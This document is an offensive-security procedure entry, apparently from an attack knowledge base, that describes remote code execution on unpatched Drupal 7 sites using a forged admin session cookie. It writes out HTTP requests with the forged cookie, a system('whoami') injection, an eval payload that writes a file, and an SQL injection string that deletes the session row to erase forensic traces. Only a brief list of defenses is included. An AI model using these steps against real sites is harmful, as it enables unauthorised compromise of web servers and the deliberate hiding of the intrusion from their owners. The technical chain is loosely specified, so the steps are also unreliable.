---
id: rce-via-session-001
tags:
  - rce
  - session-hijacking
  - drupal
  - php
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
  - PHP
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Command-Line Interface]]'
updated_at: '2025-12-14T03:46:20.029Z'
skill_level: advanced
impact_level: critical
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Command-Line Interface]]'
---
# Achieve RCE via Manipulated Admin Session

## Summary

This procedure leverages the forged admin session to impersonate a privileged user and execute arbitrary PHP code through Drupal's callback mechanisms, achieving full site compromise.

## Description

With the admin session SID in a cookie, access protected routes that invoke PHP callbacks, such as menu items or form processors. Inject code via serialized session data or direct eval in vulnerable modules. A cleanup step removes the session to minimize traces, enabling stealthy RCE on unpatched Drupal 7 sites.

## Requirements

1. Forged admin session from prior insertion
2. Knowledge of Drupal's hook_menu and callback system
3. HTTP client supporting cookies

## Defense

Defensive measures and detection strategies:

- Validate session data integrity with hashes
- Disable or audit PHP callbacks in modules
- Monitor for unexpected admin actions from unknown IPs
- Use file integrity monitoring for RCE indicators

## Objectives

1. Impersonate admin for privileged access
2. Trigger PHP code execution
3. Clean up to evade forensics

## Instructions

### Step 1: Set Session Cookie

**Context**: Use the malicious SID to authenticate as admin.

```http
GET /admin/config HTTP/1.1
Host: target.com
Cookie: SESSmalicious_sid=serialized_admin_data
```

> This grants admin privileges without login.

### Step 2: Trigger RCE Callback

**Context**: Target a callback allowing code injection, e.g., a custom form or module hook.

Request a path like /admin/exec with injected PHP in params or session:

```http
POST /admin/custom-form HTTP/1.1
Cookie: SESSmalicious_sid=...

code=system('whoami');
```

If using eval-capable feature:

```php
eval('phpinfo(); file_put_contents("/tmp/pwned", "RCE");');
```

> Executes arbitrary code, e.g., writes file or runs commands.

### Step 3: Cleanup Session

**Context**: Delete the session to avoid detection.

Inject DELETE: '); DELETE FROM sessions WHERE sid=\'malicious_sid\' -- '

Via another request.

> Success: No trace in DB, but RCE effects persist.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Command-Line Interface]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- rce
- session-hijacking
- drupal
- php
